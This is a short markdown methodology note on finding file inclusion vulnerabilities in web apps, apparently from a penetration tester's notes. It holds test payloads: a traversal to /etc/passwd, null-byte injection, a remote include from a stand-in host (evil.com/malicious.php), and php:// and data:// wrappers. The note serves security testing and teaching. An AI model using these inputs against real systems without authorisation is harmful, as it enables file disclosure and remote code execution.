---
title: "File Inclusion"
layout: notes
tags:
  - webapp
  - methodology
  - lfi
  - FI_parameters
  - FI_user-input
  - FI_http-headers
  - Co_sensitive-info-disclosure
  - Co_rce
  - Co_xss
---
## Summary

Applications routinely need to read and modify files on the fly for various functionality to exist. Because of this each application will have a potentially different way to reference files at their respective locations. Abusing the logic on the backend can allow an attacker to redirect an intended file read to an unintended file, leaking potentially sensitive data. Can be combined with SSRF - Server Side Request Forgery and Directory Traversal to further enumerate and leak data.

## Methodology

When looking for File Inclusion vulnerabilities ask/try the following:
- [ ] **What is the technology stack?**
	- [ ] **What is the server-side language (PHP, JSP, ASP)**
	- [ ] **What is the web-server (Apache, Nginx, IIS)**
- [ ] try to access local files (../../../etc/passwd)
	- [ ] test with common unix and windows paths
	- [ ] add null byte injection at the end (../../../etc/passwd%00)
- [ ] try to include remote files `https://evil.com/malicious.php`
- [ ] **Is user input being sanitized?**
	- [ ] try to determine rules and find a bypass
- [ ] try different protocols `php:// data://`

## Capabilities

Sensitive data exposure  
Remote code execution  
Cross-site Scripting  

## Found In

Parameters  
User Input  
HTTP Headers  
